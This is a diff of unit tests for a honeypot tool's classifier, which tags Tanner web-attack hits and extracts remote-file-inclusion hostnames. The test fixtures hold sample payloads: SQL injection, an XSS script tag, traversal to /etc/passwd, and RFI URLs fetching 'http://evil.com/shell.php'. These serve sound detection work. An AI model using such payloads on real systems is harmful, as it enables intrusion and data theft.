@@ -240,113 +240,88 @@ class TestTannerAttackClassification(ExtractionTestCase):
         )
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_sqli_tagged(self, mock_add_tags, mock_iocs_from_hits):
+    def test_sqli_tagged(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT * FROM users"}]
         self.strategy.extract_from_hits(hits)
 
-        # check if tag was added
-        found = False
-        for call in mock_add_tags.call_args_list:
-            _, tags = call[0]
-            for tag in tags:
-                if tag["ioc_id"] == mock_ioc_record.id and tag["value"] == "sqli":
-                    found = True
-                    break
-        self.assertTrue(found, "Tag sqli not added")
+        attack_types_by_ioc = self.mock_ioc_repo.bulk_add_http_attack_types.call_args[0][0]
+        self.assertIn("sqli", attack_types_by_ioc[mock_ioc_record.id])
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_sqli_plus_encoded_detected(self, mock_add_tags, mock_iocs_from_hits):
+    def test_sqli_plus_encoded_detected(self, mock_iocs_from_hits):
         """UNION+SELECT (+ as space in query string) must be detected as SQLi."""
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1+UNION+SELECT+*+FROM+users"}]
         self.strategy.extract_from_hits(hits)
 
-        # check if tag was added
-        found = False
-        for call in mock_add_tags.call_args_list:
-            _, tags = call[0]
-            for tag in tags:
-                if tag["ioc_id"] == mock_ioc_record.id and tag["value"] == "sqli":
-                    found = True
-                    break
-        self.assertTrue(found, "Tag sqli not added")
+        attack_types_by_ioc = self.mock_ioc_repo.bulk_add_http_attack_types.call_args[0][0]
+        self.assertIn("sqli", attack_types_by_ioc[mock_ioc_record.id])
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_mixed_attacks_produce_multiple_tags(self, mock_add_tags, mock_iocs_from_hits):
+    def test_mixed_attacks_produce_multiple_types(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?file=../../../etc/passwd&q=<script>alert(1)</script>"}]
         self.strategy.extract_from_hits(hits)
 
-        tag_values = [tag["value"] for call in mock_add_tags.call_args_list for tag in call[0][1]]
-        self.assertIn("lfi", tag_values)
-        self.assertIn("xss", tag_values)
+        attack_types_by_ioc = self.mock_ioc_repo.bulk_add_http_attack_types.call_args[0][0]
+        self.assertIn("lfi", attack_types_by_ioc[mock_ioc_record.id])
+        self.assertIn("xss", attack_types_by_ioc[mock_ioc_record.id])
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_benign_request_no_tags(self, mock_add_tags, mock_iocs_from_hits):
+    def test_benign_request_no_tags(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         hits = [{"src_ip": "1.2.3.4", "url": "/index.html?page=about"}]
         self.strategy.extract_from_hits(hits)
-        mock_add_tags.assert_called_once_with("tanner", [])
+        self.mock_ioc_repo.bulk_add_http_attack_types.assert_called_once_with({})
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_missing_src_ip_skipped(self, mock_add_tags, mock_iocs_from_hits):
+    def test_missing_src_ip_skipped(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         hits = [{"url": "/page?id=1 UNION SELECT *"}]
         self.strategy.extract_from_hits(hits)
-        mock_add_tags.assert_called_once_with("tanner", [])
+        self.mock_ioc_repo.bulk_add_http_attack_types.assert_called_once_with({})
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_unknown_scanner_ip_skipped(self, mock_add_tags, mock_iocs_from_hits):
+    def test_unknown_scanner_ip_skipped(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         self.mock_ioc_repo.get_ioc_by_name.return_value = None
         hits = [{"src_ip": "9.9.9.9", "url": "/page?id=1 UNION SELECT *"}]
         self.strategy.extract_from_hits(hits)
-        mock_add_tags.assert_called_once_with("tanner", [])
+        self.mock_ioc_repo.bulk_add_http_attack_types.assert_called_once_with({})
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_new_tag_increments_counter(self, mock_add_tags, mock_iocs_from_hits):
+    def test_new_iocs_increments_counter(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
+        self.mock_ioc_repo.bulk_add_http_attack_types.return_value = 1
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1; SLEEP(5)--"}]
         self.strategy.extract_from_hits(hits)
 
-        self.assertGreater(self.strategy.attack_tags_added, 0)
+        self.assertGreater(self.strategy.iocs_with_attack_types, 0)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_existing_tag_not_counted(self, mock_add_tags, mock_iocs_from_hits):
+    def test_existing_iocs_not_counted(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 0
+        self.mock_ioc_repo.bulk_add_http_attack_types.return_value = 0
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?id=1 UNION SELECT *"}]
         self.strategy.extract_from_hits(hits)
 
-        self.assertEqual(self.strategy.attack_tags_added, 0)
+        self.assertEqual(self.strategy.iocs_with_attack_types, 0)
 
 
 @override_settings(THREATFOX_API_KEY="")
@@ -361,13 +336,10 @@ class TestTannerRfiExtraction(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_hostname_as_payload_request(self, mock_add_tags, mock_threatfox, mock_iocs_from_hits):
+    def test_rfi_hostname_as_payload_request(self, mock_threatfox, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-
-        mock_add_tags.return_value = 1
 
         rfi_ioc_record = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc_record)
@@ -382,8 +354,7 @@ class TestTannerRfiExtraction(ExtractionTestCase):
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
     @patch("greedybear.cronjobs.extraction.strategies.tanner.threatfox_submission")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_links_scanner_to_hostname(self, mock_add_tags, mock_threatfox, mock_iocs_from_hits):
+    def test_rfi_links_scanner_to_hostname(self, mock_threatfox, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         scanner_record = self._create_mock_ioc("1.2.3.4")
         hostname_record = self._create_mock_ioc("evil.com", ioc_type="domain")
@@ -393,7 +364,6 @@ class TestTannerRfiExtraction(ExtractionTestCase):
             "evil.com": hostname_record,
         }.get(name)
 
-        mock_add_tags.return_value = 1
         self.strategy.ioc_processor.add_ioc = Mock(return_value=hostname_record)
 
         hits = [{"src_ip": "1.2.3.4", "url": "/page?file=include http://evil.com/shell.php"}]
@@ -403,12 +373,10 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         hostname_record.related_ioc.add.assert_called_with(scanner_record)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_same_hostname_deduplicated(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_same_hostname_deduplicated(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -421,12 +389,10 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(len(payload_calls), 1)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_counter(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_counter(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -437,12 +403,10 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertGreater(self.strategy.rfi_hostnames_added, 0)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_invalid_url_no_crash(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_invalid_url_no_crash(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         self.strategy.ioc_processor.add_ioc = Mock(return_value=None)
 
@@ -452,12 +416,10 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(self.strategy.rfi_hostnames_added, 0)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_sensor_attached_to_ioc(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_sensor_attached_to_ioc(self, mock_iocs_from_hits):
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -475,13 +437,11 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(ioc_arg._sensors_to_add, [mock_sensor])
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_outer_param_stripped_from_url(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_outer_param_stripped_from_url(self, mock_iocs_from_hits):
         """URL without a query string: '&' is an outer request separator and must be stripped."""
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -496,13 +456,11 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(submitted_url, "http://evil.com/shell.php")
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_query_string_params_preserved(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_query_string_params_preserved(self, mock_iocs_from_hits):
         """URL with a real query string: '&' within the query must NOT be stripped."""
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -517,13 +475,11 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(submitted_url, full_url)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_trailing_delimiters_stripped_from_url(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_trailing_delimiters_stripped_from_url(self, mock_iocs_from_hits):
         """Trailing ')', ',', ';' characters must be stripped from extracted URLs."""
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -537,13 +493,11 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(submitted_url, "http://evil.com/shell.php")
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_timestamp_set_on_ioc(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_timestamp_set_on_ioc(self, mock_iocs_from_hits):
         """first_seen and last_seen on the RFI IOC must match the hit's @timestamp."""
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
@@ -561,13 +515,11 @@ class TestTannerRfiExtraction(ExtractionTestCase):
         self.assertEqual(ioc_arg.last_seen, expected_time)
 
     @patch("greedybear.cronjobs.extraction.strategies.tanner.iocs_from_hits")
-    @patch("greedybear.cronjobs.extraction.strategies.tanner.TagRepository.add_tags")
-    def test_rfi_missing_timestamp_no_crash(self, mock_add_tags, mock_iocs_from_hits):
+    def test_rfi_missing_timestamp_no_crash(self, mock_iocs_from_hits):
         """Missing @timestamp must not crash; IOC is still created without explicit timestamps."""
         mock_iocs_from_hits.return_value = []
         mock_ioc_record = self._create_mock_ioc("1.2.3.4")
         self.mock_ioc_repo.get_ioc_by_name.return_value = mock_ioc_record
-        mock_add_tags.return_value = 1
 
         rfi_ioc = self._create_mock_ioc("evil.com", ioc_type="domain")
         self.strategy.ioc_processor.add_ioc = Mock(return_value=rfi_ioc)
